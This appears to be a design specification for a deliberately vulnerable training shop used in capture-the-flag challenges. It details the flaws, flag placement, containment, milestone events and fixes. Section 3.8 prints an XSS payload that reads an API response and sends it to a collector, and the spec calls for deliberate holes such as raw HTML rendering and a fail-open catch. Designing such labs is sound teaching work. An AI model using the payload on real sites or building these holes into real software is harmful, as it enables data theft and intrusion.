**Unintended-exploit risks.** The six containment rules of RS-F plus the D-23 host rule: internal network with no default route; `vm-meta` reachable only from the shop container; no published port; not reachable through `host.docker.internal` or the host gateway (spike S1); http and https only; timeout, 1 MB cap, concurrency limit; control plane on a network the shop cannot reach. Importer error text must not name the internal service (C05 conflict). Mock-services endpoints must not expose any other flag or a write action that changes challenge state.

---

### C11 Mishandling of Exceptional Conditions (2021 none / 2025 A10) - difficulty 3

**Host feature.** Seller registration `/sell/register`. The shop sends the tax ID to the mock KYC provider. The verify call is wrapped in a catch that returns `verified` on any thrown error ("never block onboarding on a provider outage"). Two input classes (PROPOSED, DC-13):
- Class 1 (parseable but invalid, for example non-ASCII or too long): the provider answers 422. The store stays pending (correct), but the page shows a verbose upstream message (service name, URL, error body). Guidance for the player, not the bug.
- Class 2 (malformed shape, for example `tax_id[]=x`): the provider crashes with 500, the catch returns `verified`, and the store is auto-approved.

**Start state.** None beyond self-registration of a new seller store. No seeded account.

| Milestone | Outcome | Detection signal |
|---|---|---|
| M1 | The player saw the verbose KYC error. | `kyc.result` with `outcome = invalid_verbose` for a player-created store. |
| M2 | The store was approved by the fallback. | `store.approved` with `approved_by = system:kyc-fallback` (state change; no flag text needed). |
| M3 | Flag read on the Payouts page. | `proxy.flag_seen` on `/seller/payouts`. |

**Flag.** Payouts page value, shown only when `stores.approved_by = 'system:kyc-fallback'`. Injection: DB seed (sentinel table). A store approved by an admin, by C01-style access, or by any other bug never shows it. The seeded Harbor Crafts store has `approved_by = seed`.
**Why no other challenge reads it.** Sentinel rule. The Payouts page of other stores holds no flag.

**Hints.**
1. What does the shop do when it cannot understand your answer to a form question?
2. The error text names the service that checks sellers. What if that service is the one that breaks?
3. Send the tax ID in a shape the checker cannot read, and see whether the shop says no.

**Write-up outline.** Vulnerable: generic catch returns success. Fix: fail closed (reject or queue for manual review), strict input validation before the call, narrow exception types, one global handler, generic user errors, alert on provider errors.

**Tags.** CWE-636 (primary), CWE-755. RS-F also lists CWE-396, CWE-209, CWE-234 (VERIFIED by RS-F). ATT&CK T1190 only; no clean "fail open" technique. OWASP 2025 A10, 2021 none.

**Automated test.** Vulnerable: valid ID gives `pending`; `tax_id[]=x` gives `approved_by = system:kyc-fallback` and the flag on Payouts; an admin-approved store (via the admin API in test mode) shows no flag. Fixed: malformed input gives `pending` or `rejected`.

**Unintended-exploit risks.** Oversized input may crash the KYC mock: it restarts under a supervisor and is per instance. C11 error code is separate from C05 and C10. Admin approval cannot give the flag (sentinel).

---

## 3. C03 part B in detail: stored XSS seen by the support bot (OI-18)

### 3.1 User-written field (PROPOSED, DC-3)

**The ticket message body.** A customer opens "Contact support" (a ticket) or replies on it. The body is text up to 2 KB. The customer's own pages escape it. The **support console ticket view** renders the body as HTML for "formatting and links" (the deliberate flaw, written as a raw template insert). No other user-written field is rendered unescaped: reviews, product descriptions, store names, notifications and the admin Security Alerts page are all encoded. This keeps C03 part B from leaking into other pages.
Options considered: reported reviews (longer chain: buy, review, report), dispute reason (less natural for the support role). Ticket gives the shortest, most realistic path.

### 3.2 Trigger and timing (placeholders)

| Item | Value |
|---|---|
| Trigger | A ticket message by the player is stored. The shop queues one bot visit job for that ticket. |
| Delay | Fixed 10 seconds after the message is stored. |
| Visit | Fresh browser context, signs in as the bot, opens that ticket page, waits a fixed 15 seconds, closes the context. |
| Limits | One visit at a time per instance; at most 10 visits per 10 minutes; one visit per message; body at most 2 KB. |
| Player feedback | The ticket page shows "Agent has viewed this ticket at hh:mm" after the visit (realistic and helps testing). |

### 3.3 The bot's session and what it holds

- Account: `bot.support`, role support agent, own random password nobody knows. The shop mints a **server-side session** for it for each visit. The bot never uses a login route, so it writes no login event and no security event.
- Cookie: normal session cookie, HttpOnly, SameSite Lax. It holds no platform secret. The payload cannot read it (it is not the target).
- **Session scope (PROPOSED, DC-5):** the bot session is marked `kind = bot` and the server allows only `GET` on `/support/tickets/*` and `GET /support/api/agent-profile`. Order views, case notes, disputes, moderation, any `POST`, and the admin area return 403 for a bot session. This is what stops the payload reading the C01 order flag or the C09 case-note flag (a real support agent can read both).
- What the payload can reach: `GET /support/api/agent-profile`, which returns the bot's profile including `console_key` = `<FLAG_C03B>`. Only the bot session gets this value. Any other support session (for example `s.iyer` after C09) gets its own non-flag `console_key`.

### 3.4 Collector and per-instance token

- The **collector** is a small listener in the mock-services container, reachable on the instance network by the bot browser and by the player's brief address. Path: `/c/<collector_id>` where `<collector_id>` is a random per-instance value shown in the player's brief (so only this instance's brief points at it). PROPOSED (DC-4).
- It accepts GET and POST, keeps the last 20 hits in memory only, and sends the platform `collector.hit` with: `bot_tagged` (true when the request carries the visit tag the bot's network layer adds), `candidate_sha256` for any value that looks like a flag, and no content.
- The platform recomputes the HMAC for `C03B`, compares the hash, and credits M3. It never stores the token.
- **Player reads the result** through a read-only page `/lab/listener` (player session only, proxied to the collector inbox). The brief says this page is the "listener". This keeps the flag visible to the player for the paste backup.
- The capture event (`evidence.capture`, Section 10) stores the ticket message id and the collector request body, capped at 8 KB with secrets redacted (D-22, D-25).

### 3.5 Milestone events

| Milestone | Event |
|---|---|
| M1 | `shop.ticket_markup_stored` (message contains an HTML tag; app-side check, since CRS tag names for XSS are unverified). A CRS XSS hit on the ticket POST is a second signal. |
| M2 | `collector.hit` with `bot_tagged = true` (code ran in the bot's browser). |
| M3 | `collector.hit` with `candidate_sha256` that matches the instance's `C03B` flag. |

The bot's own page views never count: `proxy.request` and `proxy.flag_seen` events from a `kind = bot` session are tagged `session_kind = bot` and ignored for player metrics.

### 3.6 How it stays away from C01, C09 and the Security Alerts page

| Other challenge | Risk | Rule |
|---|---|---|
| C01 | The XSS runs as a support agent, who can read any order including the flag buyer note. | Bot scope allow-list (3.3); buyer note hidden from the support order view. |
| C09 | The XSS runs as a support agent, who can read case notes (C09 flag). The bot's sessions could add events or failures. | Same allow-list; the bot account is not `s.iyer`; the bot never logs in through a route; no security event is written for bot sessions; C09 rule counts one account only. |
| Admin Security Alerts page | If alert rows show user text, the bot or admin viewing it becomes an extra XSS target. | The page encodes all output; alert rows hold ids and kinds only, never ticket text; the bot is never sent to admin pages. |
| Notifications | "User-written content may leak in" (RS-G). | Notification text is built from ids and fixed words, never from ticket text. |

### 3.7 Containment (D-18, FR-SHP-11)

Fresh browser context per visit. Own-instance pages only (the bot's network layer allows the shop and the collector, nothing else; a request filter inside the browser aborts any other origin; navigation to another origin is blocked). Fixed visit time, then close. Started on demand. No egress. Browser sandbox and same-origin policy on. Non-root, seccomp, resource limits. Dialogs auto-dismissed, downloads and pop-ups off. Rate limit and capped concurrency (3.2). Spike S-5 measures memory; if too heavy, one shared bot browser per host with strict fresh contexts replaces it (the same rules apply; collector ids remain per instance).

### 3.8 Fix, test, tags

- **Fix (write-up).** Escape on output everywhere; if rich text is needed use a maintained sanitizer with an allow-list; set a Content Security Policy on the support console; keep cookies HttpOnly (CWE-1004 is the matching weakness when they are not); do not expose sensitive values to scripts through APIs the console page can call.
- **Automated test.** Input: the player session posts a ticket whose body has a short illustrative script, for example `<img src=x onerror="fetch('/support/api/agent-profile').then(r=>r.text()).then(t=>new Image().src=COLLECTOR+'?d='+encodeURIComponent(t))">` with `COLLECTOR` set to the brief address. Vulnerable build: within 40 seconds `bot.visit` ends, `collector.hit` arrives with `bot_tagged = true` and a valid token hash; M1 to M3 credited. Fixed build: the page shows the text escaped, `bot.visit` still ends, no `collector.hit`, no M2 or M3. Also assert that a payload fetching `/support/orders/...` or a case-notes route gets 403 in the bot session, and that an external URL in the payload cannot be reached (no egress).
- **Tags.** CWE-79; ATT&CK T1190 and T1059.007; OWASP 2025 A05 and 2021 A03. `attack-xss` as a CRS tag name is UNVERIFIED (spike S-6).

---

## 4. C04 inside a correct refund model (OI-19)

### 4.1 The conflict

RS-G models refunds per order item with `refunded_total <= paid_for_item` checked in a transaction. RS-E's C04 has refunds per order, auto-approved, with no cumulative cap. Both cannot be true on the same path.

### 4.2 Resolution (PROPOSED, DC-7)

The shop has **two refund paths**. Only one has the gap.

| Path | Used by | Checks |
|---|---|---|
| **Item-level request** `POST /api/order-items/{id}/refunds` | Customer request (needs approval), support on behalf, seller owner approval up to a limit, dispute resolution | Calls the shared `assertRefundable(order)`, which sums **all** refund rows of the order, including quick refunds, and refuses if the sum would pass the amount paid. Seller approval limit applies. Idempotency key. Correct. |
| **Quick refund** `POST /api/orders/{id}/refunds` ("Instant goodwill refund", added later) | Customer only | Own, separate check: order is `delivered`, amount is an integer between 1 and `AUTO_LIMIT`, payment is gateway-verified, idempotency key unique. **No cumulative check, no count limit.** Auto-approved, no review. |

The story for the write-up: the quick path was added later by another team and did not reuse the shared check. Everything else in the refund model is correct, so the gap is a design flaw (no abuse-case review), not a coding slip.

### 4.3 The exact rule and limits (placeholders)

| Name | Value |
|---|---|
| `AUTO_LIMIT` per quick request | 1,500 |
| Seeded order total paid | 2,500 |
| Seller approval limit on the item path | 5,000 (placeholder) |
| Platform throttle on the quick path (safety only) | 30 requests per minute per instance |
| Count cap on the quick path | none (that is the gap) |

Quick refund rule: accept if `1 <= amount <= AUTO_LIMIT`. Commission reversal on a quick refund = `round(order_commission * amount / order_total)`. The seller bears the refund through the payout formula (FR-SHP-10).

### 4.4 How the sentinel flag is released

After every quick refund the **reconcile job** (a normal part of the ledger) recomputes `sum(approved refunds)` for the order. If it is greater than `total_paid`, it appends a ledger row of type `goodwill_adjustment` for the excess ("platform covers the overage"), with `reference` taken from the sentinel table. It also emits `shop.refund_invariant_broken`. The customer's refund statement `/orders/{id}/refunds` lists the row. With the seeded numbers, two quick refunds of 1,500 give 3,000 > 2,500 and the line appears. The reference exists in no other place, so reading the statement before the invariant breaks gives nothing. On the fixed build the quick path calls `assertRefundable` and the second request is refused.

### 4.5 Isolation from C08, C02 and the rest

- Quick refunds need `payments.status = captured` and a `gateway_ledger_id`. A C08 forged-paid order is stored `captured_unverified` with no ledger id, so it cannot be refunded or turned into money.
- Refund money goes to a non-spendable `refund_ledger`. Gift-card credit goes to a different non-spendable `promo_credit` ledger. They are never one wallet.
- Customers cannot move an order to `delivered`; only seller or admin can. Only the seeded orders can be quick-refunded by the player.

---

## 5. C10 and pending sellers (OI-20)

Options: (a) pending sellers may create draft products and use image import; (b) customers get an avatar-URL import; (c) the player starts as a seeded approved seller owner; (d) both (a) and (c).

**Recommendation (PROPOSED, DC-8): (c).** The brief gives `owner.harbor`, an approved seller owner (the seeded store is approved by seed). C10 then needs nothing from C11, and the PRD rule "pending sellers cannot publish" stays simple: **a pending seller can edit the store profile only; it cannot create products and has no image import.** After C11 fires, the store is approved and can use the importer, but that is not needed for C10. This also keeps role D-27 coverage (seller owner carries C10, C06, C11).
Why not (a): it widens what a pending store can do and invites a C11-then-C10 chain. Why not (b): adds a customer upload feature only for one challenge and changes the role that carries C10.
One cost of (c): `owner.harbor` can also hit C01 and use the C06 import. That is fine because those challenges are independently solvable and the owner holds no other flag (Section 8).

---

## 6. Difficulty to scoring tier (OI-16)

### 6.1 Proposed mapping (PROPOSED, DC-6)

| Difficulty (D-26 scale) | Tier | Weight W (placeholder) |
|---|---|---|
| 1 to 2 | Easy | 60 |
| 3 | Medium | 90 |
| 4 to 5 | Hard | 120 |

Reasoning. No challenge is rated 1, so a split at 1 versus 2 to 3 would leave Easy empty. A split at "3 to 4 together, 5 alone" would leave Hard empty (nothing is rated 5). The PRD's suggested split uses all three tiers and matches the RS-E and RS-F ramp. Difficulty 3 = "needs reasoning about how the feature works" is the natural middle. Difficulty 4 = "needs research on a library or protocol" (C06, C10) is the natural top.

C03 is the one open rating: D-26 gives 2 for the SQL part. With the XSS part (needs a bot, a payload, a listener) I propose the challenge is rated 3 (DC-2). If the user keeps 2, C03 is Easy.

### 6.2 Result with C03 = 3 (recommended)

| Tier | Challenges | Count | Weight each | Subtotal |
|---|---|---|---|---|
| Easy (60) | C01, C05, C07 | 3 | 60 | 180 |
| Medium (90) | C02, C03, C04, C08, C09, C11 | 6 | 90 | 540 |
| Hard (120) | C06, C10 | 2 | 120 | 240 |
| **Total sum(W_c)** | | 11 | | **960** |

Shown score = `round(1000 * score / 960)`. One full Medium capture, no hints = round(1000 * 90 / 960) = 94 points of 1000. One full Hard = 125. One full Easy = 63.

Milestone points (raw, before scaling): Easy 12 / 24 / 60, Medium 18 / 36 / 90, Hard 24 / 48 / 120 at M1 / M2 / M3. Hint cost per level: 10, 20, 30 percent of W (so 6, 12, 18 for Easy; 9, 18, 27 Medium; 12, 24, 36 Hard).

### 6.3 Result with C03 = 2 (alternative)

Easy: C01, C03, C05, C07 = 4 x 60 = 240. Medium: C02, C04, C08, C09, C11 = 5 x 90 = 450. Hard: C06, C10 = 240. Total 930.

Placeholders only; to be tuned in the pilot (OI-4). Appendix A of the PRD uses the same formula.

---

## 7. (merged into Section 2 and Section 3: milestone events are defined per challenge; the platform rule is "any valid path, best milestone counts once")

---

## 8. Seeded accounts and flag locations

### 8.1 Account matrix

Passwords are stored with a strong adaptive hash (FR-SHP-09). "Player" = given to the player in the brief. Every password is random per instance (HMAC-derived by the injector, PROPOSED, DC-12) except the one deliberate weak password. No two accounts share a password, secret or reset mailbox.

| Account | Role | Store | Purpose | Challenge | How its password or secret differs |
|---|---|---|---|---|---|
| `staff.harbor` | Seller staff | Harbor Crafts (approved) | Player start for C01 | C01 | Random per instance, given to the player |
| `owner.harbor` | Seller owner | Harbor Crafts (approved by seed) | Player start for C06 and C10; can also hit C01 | C06, C10 | Random per instance, given to the player; different from staff |
| `cust.player` | Customer | none | Player start for C02, C04 (seeded delivered order), C07, C08, C09, C03 part B | C02, C03B, C04, C07, C08, C09 | Random per instance, given to the player |
| (new seller) | Seller owner, pending | self-registered | Player creates it | C11 | Chosen by the player |
| `owner.northwind` | Seller owner | Northwind Tea Co | Holds the C01 flag order | C01 (target) | Random, nobody receives it |
| `staff.northwind` | Seller staff | Northwind Tea Co | Filler | none | Random, nobody receives it |
| `owner.lumen` | Seller owner | Lumen Lamps | Filler store for enumeration | C01 | Random, nobody receives it |
| `buyer.01` to `buyer.nn` | Customers | none | Fake buyers on seeded orders | C01 | Random, nobody receives it |
| `fin.ops` | Finance | none | Target of the reset brute force; its flag page | C07 | Random strong password, never given; after takeover, player-chosen |
| `s.iyer` | Support agent, dormant | none | Brute-force target; case notes with the flag | C09 | The one deliberate weak password, from a list of 10 entries ranked within the top 500 of a named common-password list (PROPOSED; picked per instance; spike S2). Different from every other account. |
| `bot.support` | Support agent (bot, scoped) | none | Victim of stored XSS | C03B | Random, nobody knows it; the bot gets a server-minted session, never logs in |
| `admin.root` | Admin | none | Approver for C11; Security Alerts page for C09; seed owner | C11, C09 | Random; TOTP not used inside the shop; nobody receives it |

Rules: no account password equals another; the C07 reset mailbox and the finance password are unrelated to the C09 password; the finance account is not in the C09 wordlist rank range.

### 8.2 Flag-location table

| Challenge | Where the flag lives | Injection | Who can read it | Why no other challenge can |
|---|---|---|---|---|
| C01 | `orders.buyer_note` of one Northwind order, shop DB | DB seed (injector) | Sellers via the C01 flaw; Northwind users, customer buyer of that order, admin | Field hidden from support, finance and public views; not in the catalog store |
| C02 | `gift_cards.message`, serial 1, shop DB | DB seed | Whoever redeems the card (the flaw) | Shown only in the redeem response; no password hash leak exists |
| C03 A | `ops_notes` row 2, catalog store (separate container) | Written before the store is made read-only | Anyone who injects the search (the flaw) | Catalog store holds only catalog data |
| C03 B | `console_key` of `bot.support`, returned by `/support/api/agent-profile` | DB seed | Only the bot session (and so a payload running in it) | Bot session scope blocks orders and case notes; other support sessions get different keys |
| C04 | `reference` of the `goodwill_adjustment` row | Sentinel table, DB seed; written only on invariant break | The player on their own refund statement, after the break | Row absent until the break; forged-paid orders are not refundable |
| C05 | One value in the synthetic diagnostics object | DB seed read at start-up | Anyone calling `/_ops/diagnostics` (the flaw) | Object is hand-built and holds no other secret |
| C06 | `auditToken`, import service only | Read-only file mounted only in the import service | Whoever pollutes the job (the flaw) | Import service has no network or DB and no other flag; shop has no copy |
| C07 | Settlement reference on the finance settings page | DB seed | Finance sessions only | Only account takeover opens it; the page holds no other flag |
| C08 | `payment_ref` of a sandbox-accepted payment | Sentinel table; written only on that path | The customer of the forged order | Path-only release; seeded orders untouched |
| C09 | Break-glass reference in a case note of `s.iyer` | DB seed | Support sessions (not the bot) and admin | Bot scope blocks case notes; others cannot log in without the weak password |
| C10 | `/latest/user-data` of `vm-meta` | Read-only file mounted only in mock-services | The importer (the flaw) | No other flag in mock-services; fetcher is http and https only |
| C11 | Payouts page value, shown only when `approved_by = system:kyc-fallback` | Sentinel table | The seller whose store was approved by fallback | Sentinel; admin-approved stores never see it |

Decoy flags (D-22 anti-cheat) are not placed by this file; their locations belong to the anti-cheat design (see Section 13).

---

## 9. Cross-challenge conflicts resolved

### 9.1 RS-E list (10 items)

| # | Conflict | Resolution | Affects |
|---|---|---|---|
| E1 | C02 vs C04: both touch money | Gift-card credit goes to `promo_credit`, refund money to `refund_ledger`. Both non-spendable, never one wallet. | FR-CHL-03, FR-CHL-05, FR-SHP-10 |
| E2 | C03 vs C07, C01: a UNION dump could show credentials or other flags | Search runs on the separate read-only catalog store with only products, reviews and `ops_notes`. | FR-CHL-04, FR-INS-02 |
| E3 | C05 vs C07 and C03: the dump could hold the session secret, passwords or database credentials | Diagnostics object is hand-built from synthetic values. A CI check greps the object for env names. | FR-CHL-06 |
| E4 | C05 vs C11 and C06: shared error handler; dependency versions in the dump | C05, C10, C11 use three separate error-handling code paths. Diagnostics shows no dependency versions. | FR-CHL-06, FR-CHL-12 |
| E5 | C01 vs C09: logging of cross-store reads could reveal the C01 flag | `shop.cross_store_order_read` carries ids only. The shop's own security log does not record order reads, and C09 counts only the legacy login route. | FR-CHL-02, FR-CHL-10, FR-DET-08 |
| E6 | C06 vs C10 and C08: the import service could become an SSRF pivot or deserialise objects | Import service has no outbound network and parses JSON only. No second path. | FR-CHL-07, FR-CHL-11 |
| E7 | C01 vs C06: both use the seeded seller logins | Import jobs are scoped per store; the C06 job never reads orders. | FR-CHL-07 |
| E8 | C04 vs C01 and C07: the victim order could leak the flag through another challenge | The C04 order is the player's own order; the flag row does not exist until the break; the C01 seller view does not show customer-order refunds. | FR-CHL-05 |
| E9 | Role rule D-11: roles not carried by C01 to C06 | Settled by D-27: C03B (support victim), C09 (support target), C07 (finance), C11 (admin). Nothing to change. | D-11, D-27 |
| E10 | Seed data RS-G must supply | Section 11 lists each required record and its link to one flag. | FR-SHP-08, FR-SHP-12 |

### 9.2 RS-F list (10 items)

| # | Conflict | Resolution | Affects |
|---|---|---|---|
| F1 | C07 vs C09: both use guessing | Reset-confirm failures are logged normally (alerts appear). The legacy login is silent. Different passwords. M2 of C09 counts one account and only the legacy route. | FR-CHL-08, FR-CHL-10 |
| F2 | C08 vs C04: a route to a free order must not release the C08 flag | Sentinel: only the sandbox-accepted webhook writes `payment_ref` from the sentinel table. | FR-CHL-09 |
| F3 | C08 vs refunds: forged-paid order must not produce money | Forged orders are `captured_unverified` and not refundable (Section 4.5). | FR-CHL-09, FR-SHP-10 |
| F4 | C10 vs C05: the internal name must not be given away | Diagnostics object and C05 errors never contain `vm-meta`, its host name or IP. | FR-CHL-06, FR-CHL-11 |
| F5 | C10 vs C11: shared verbose-error handler | Separate code and separate tests; fixing one does not fix the other. | FR-CHL-11, FR-CHL-12 |
| F6 | C11 vs C01: admin-approval bypass must not capture the C11 flag | Sentinel on `approved_by = system:kyc-fallback`. | FR-CHL-12 |
| F7 | C09 vs C03: the Security Alerts page could be an extra XSS target | Page encodes all output; alert rows hold ids and kinds only; bot never visits admin pages. | FR-CHL-10, FR-SHP-11 |
| F8 | C07 vs C02: reset-token weakness vs crypto weakness | Different mechanisms: 4-digit code with no limit versus an unsalted hash of a counter. They share no code or token store. | FR-CHL-03, FR-CHL-08 |
| F9 | Code execution or file read in the shop would reveal every flag | No challenge gives code execution (C06 is contained in a separate service; C03 reads a separate store; C10 is http and https only). Flags are in DB seed or per-container read-only files, not in env or plain shop filesystem. | FR-CHL-13, FR-FLG-03 |
| F10 | Seller staff attacking C10: a role boundary that leaks | C10 is attacked by the seeded owner. Staff can import images but the shop ignores store scoping only for order detail (C01). The importer is scoped per store. | FR-CHL-11 |

### 9.3 New conflicts found while writing this file

| # | Conflict | Resolution | Affects |
|---|---|---|---|
| N1 | A real support agent reads any order and case notes. The XSS bot (a support agent) or a C09 takeover could read the C01 flag order or other flags. | Hide `buyer_note` from the support order view (DC-9). Limit the bot session to tickets and the agent-profile API (DC-5). | FR-CHL-02, FR-CHL-04, FR-SHP-03, FR-SHP-11 |
| N2 | RS-F A4 says the monitor reads the shop DB and `security_events`. FR-SHP-14 says the shop talks to the platform only through signed events. | The shop sends `auth.attempt` and `shop.security_event_written` events (DC-11). No database read. | FR-SHP-14, FR-DET-06 |
| N3 | C07 start is a customer, but RS-F says the finance email is on seller payout statements. | The finance mailbox is on the public Contact page (DC-10). | FR-CHL-08 |
| N4 | The C03B collector in mock-services is reachable from the C10 importer. | The collector path has a per-instance random id the importer cannot know; the inbox page is on the shop and needs the player session. | FR-CHL-04, FR-CHL-11 |
| N5 | C03B ticket text could appear in notifications or alerts and run there. | Notifications and alerts are built from ids and fixed words only. | FR-SHP-02 |
| N6 | `owner.harbor` can also hit C01 and import. | Accepted: it holds no other flag. | FR-CHL-13 |
| N7 | The support order view needs `s.iyer` (C09) to not see `bot` secrets or flags of C03B. | `console_key` is per account; only the bot's is the flag. | FR-CHL-10 |

---

## 10. Event catalogue (input to the interface contracts)

Rules: all events are signed with the per-instance key, idempotent by `event_id`, buffered when the platform is down (FR-DET-04). Fields are ids, classes, counts and hashes. No request bodies, except `evidence.capture`. Flag-looking values are sent only as `candidate_sha256`; the platform recomputes the HMAC (the key never enters an instance).

**Envelope (all events):** `event_id`, `instance_id`, `ts` (UTC), `source` (`sidecar`, `shop`, `import`, `mock`, `bot`), `type`, `session_kind` (`player`, `bot`, `anon`, `internal`), `user_id` (shop id or null), `data` (the fields below).

| Event type | Source | Fields (in `data`) | Emitted when | Used by |
|---|---|---|---|---|
| `proxy.request` | sidecar | method, route_template, status, resp_len, client_class | Each proxied request (summary) | all (timing, activity); C09 M1 backup |
| `proxy.crs_match` | sidecar | rule_ids, tags, anomaly_score, route_template | A CRS rule matches (detect-only) | C03A M1; technique label |
| `proxy.flag_seen` | sidecar | candidate_sha256, challenge_hint, route_template, request_ref | A response holds a string matching the flag format | M3 for C01 to C11 |
| `evidence.capture` | sidecar or collector | challenge_id, request_ref, body (at most 8 KB, secrets redacted), headers_redacted | A capture is credited. The only event with a body (D-22, D-25) | all M3 evidence |
| `shop.cross_store_order_read` | shop | order_id, caller_user_id, caller_store_id, order_store_id | Order detail returns an order of another store | C01 M1, M2 |
| `shop.giftcard_attempt` | shop | user_id, result (`malformed`, `unknown_wellformed`, `redeemed`), card_class (`own`, `unsold_test`, `flag_card`, `none`) | Each redeem call | C02 |
| `shop.catalog_query_error` | shop | route, error_class | Search query raised a SQL error | C03A M1 |
| `shop.ticket_markup_stored` | shop | ticket_id, message_id, user_id | A ticket message with an HTML tag is stored | C03B M1 |
| `bot.visit` | bot | visit_id, ticket_id, phase (`queued`, `start`, `end`), duration_ms | Each visit step | C03B (and exclusion of bot traffic) |
| `collector.hit` | mock | collector_id_ok, bot_tagged, candidate_sha256, size | A request reaches the collector | C03B M2, M3 |
| `shop.refund_decision` | shop | order_id, refund_id, path (`quick`, `item`), amount, decision, cumulative_after | A refund is decided | C04 M1, M2 |
| `shop.refund_invariant_broken` | shop | order_id, paid, refunded_total | Reconcile finds refunds above amount paid | C04 M3 |
| `shop.verbose_error` | shop | route, handler (`c05_api`, `c10_import`, `c11_kyc`) | A verbose error is served | C05 M1 |
| `ops.page_served` | shop | path, client_class | An `/_ops/*` page is served | C05 M2, M3 |
| `import.job` | import (via shop) | job_id, store_id, flagged_keys, polluted, audit_token_issued | Each preview job ends | C06 |
| `auth.reset_requested` | shop | account_id, account_role, account_found | `/auth/forgot` called | C07 M1 |
| `auth.reset_confirm_batch` | shop | account_id, fail_count, ok_count, window_s | Every 10 s while confirms arrive | C07 backup |
| `auth.password_reset_completed` | shop | account_id, account_role | A reset ends with a new password | C07 M2 |
| `auth.attempt` | shop | route (`web`, `legacy`, `reset_confirm`), account_id, result | Every login attempt on every route (platform telemetry, separate from the shop's security log) | C09 M1, M2 |
| `shop.security_event_written` | shop | account_id, kind | The shop's own security-event pipeline writes a row | C09 M2 (zero count), alerts |
| `webhook.received` | shop | order_id, source (`gateway`, `non_gateway`), verified, sandbox_header, accepted | Webhook called | C08 M1, M2 |
| `order.paid` | shop | order_id, verified, via | An order becomes paid | C08 M2 |
| `gateway.ledger_entry` | mock | order_id, amount | The mock gateway records a payment | C08 backup rule |
| `importer.fetch_attempt` | shop | job_id, url_class (`external`, `loopback`, `private`, `link_local`, `internal_name`, `other`), blocked, status | Each image import | C10 M1 |
| `meta.request_served` | mock | path, ua_class (`importer`, `rates`, `health`) | `vm-meta` serves a request | C10 M2, M3 |
| `kyc.result` | shop | store_id, outcome (`valid`, `invalid_verbose`, `provider_error_fallback`) | KYC call finished | C11 M1 |
| `store.approved` | shop | store_id, approved_by | A store becomes approved | C11 M2 |
| `instance.flags_injected` | orchestrator side | challenge_ids | Injection done, before "ready" (FR-INS-11) | all |

Notes. `session_kind = bot` events never feed player milestones (FR-DET-09). Volume: `proxy.request` and `auth.reset_confirm_batch` are aggregated to avoid thousands of events during brute force (PROPOSED batch window 10 s).

---

## 11. Shop features required by the challenges (checklist for the shop developer)

| # | Feature | Page or route | Role | Challenge |
|---|---|---|---|---|
| 1 | Sequential order numbers `VM-1002xx`; per-store order lines | Seller orders list and detail, `/api/seller/orders/{orderNo}` | Seller owner, staff | C01 |
| 2 | Deliberate missing store check on order detail; buyer note field | same | Seller | C01 |
| 3 | Seeded Northwind order with the flag in the buyer note; filler orders from other stores with fake buyers | seed | system | C01 |
| 4 | Support order view without buyer note | `/support/orders/*` | Support agent | C01, C09 conflict |
| 5 | Gift cards: buy, receipt with card number, redeem, non-spendable `promo_credit` ledger | Wallet, `POST /api/wallet/redeem` | Customer | C02 |
| 6 | Seeded cards: serial 1 (flag), serials 2 and 3 (marker) | seed | system | C02 |
| 7 | Product search on the separate catalog store, concatenated query, `ops_notes` table with marker row and flag row | `GET /api/products/search` | Anyone | C03 A |
| 8 | Support tickets: create, reply, customer view escaped, "viewed by agent" marker | Contact support, ticket page | Customer | C03 B |
| 9 | Support console ticket view with the raw HTML flaw | `/support/tickets/{id}` | Support agent | C03 B |
| 10 | Bot job queue, bot session mint with `kind = bot` scope (tickets and agent-profile only), rate limits | server side | Bot (support agent) | C03 B |
| 11 | Agent-profile API returning a per-account `console_key` | `GET /support/api/agent-profile` | Support agent | C03 B |
| 12 | Collector listener and player inbox page | mock-services, `/lab/listener` | Player | C03 B |
| 13 | Quick refund path with its own check; item-level path with shared `assertRefundable`; `refund_ledger`; reconcile job writing the goodwill row | Order detail, `POST /api/orders/{id}/refunds`, `POST /api/order-items/{id}/refunds`, refund statement | Customer; seller, support, admin on item path | C04 |
| 14 | Seeded delivered order for `cust.player` (2,500) | seed | system | C04 |
| 15 | Operations console `/_ops/`, `/_ops/diagnostics`, verbose handler on `POST /api/cart` | routes | Anyone | C05 |
| 16 | Bulk catalog import preview calling the import service; notices page and SBOM | `/seller/import`, `/legal/open-source`, SBOM file | Seller | C06 |
| 17 | Password reset with 4-digit code, enumeration, internal sandbox mailbox | `/auth/forgot`, `/auth/reset/confirm` | Anyone | C07 |
| 18 | Finance account and settlement settings page; public Contact page with role mailboxes | `/finance/settings/settlement`, `/contact` | Finance; anyone | C07 |
| 19 | Payment webhook with the sandbox bypass; "Seller integration" help page; mock gateway signing and ledger | `POST /webhooks/payments`, help page | Customer (attacker) | C08 |
| 20 | `payments.status` values `captured` and `captured_unverified`; refund eligibility rule | server side | system | C08, C04 |
| 21 | Web login lock after 5 failures with alert; legacy mobile login with no logging; "Get the app" page | `/login`, `/m/api/v1/login` | Support agent (target) | C09 |
| 22 | `security_events` table and Security Alerts page that encodes all output; events `auth.attempt` and `shop.security_event_written` | `/admin/alerts` | Admin | C09 |
| 23 | Dormant support agent `s.iyer`, case notes with the flag | `/support/cases/*` | Support agent | C09 |
| 24 | Product editor with "Import image from URL", string blocklist, verbose error echo (200 chars), fetcher http and https only | `/seller/products/{id}/edit` | Seller owner | C10 |
| 25 | `vm-meta` fake metadata service with `/latest/user-data`, `/healthz`, `/rates`; request log | mock-services | system | C10 |
| 26 | Seller registration with KYC call, fail-open catch, two error classes, supervised KYC mock | `/sell/register` | Seller owner | C11 |
| 27 | `stores.approved_by` field; Payouts page showing the flag only for the fallback value | `/seller/payouts` | Seller owner | C11 |
| 28 | Admin approval queue (human approval path, no flag) | `/admin/sellers` | Admin | C11 |
| 29 | Seeded accounts, stores and filler data (Section 8) with strong hashing | seed | system | all |
| 30 | Sentinel table read only by the owning code path; flags injected at start; `/health` | server side | system | all |

---

## 12. Decision candidates for the user

Each has options, my recommendation (written into the spec as PROPOSED) and the reason.

| ID | Question | Options | Recommend | Reason |
|---|---|---|---|---|
| DC-1 | How do the two C03 parts score? | (A) M1 = either part, M2 = one part done, M3 = both flags. (B) Either part reaches M3 (the other is optional). (C) Split into two weights C03a, C03b. | A | Uses both parts (D-18, "two milestones") without changing the 11-challenge catalogue. B makes XSS optional. C changes the weight table. |
| DC-2 | Challenge rating and tier for C03 | (A) 3 (Medium). (B) Keep 2 (Easy). | A | The XSS part needs a bot, a payload and a listener. |
| DC-3 | Host field for the XSS | (A) Ticket message. (B) Reported review. (C) Dispute reason. | A | Shortest realistic path; support role reads tickets daily. |
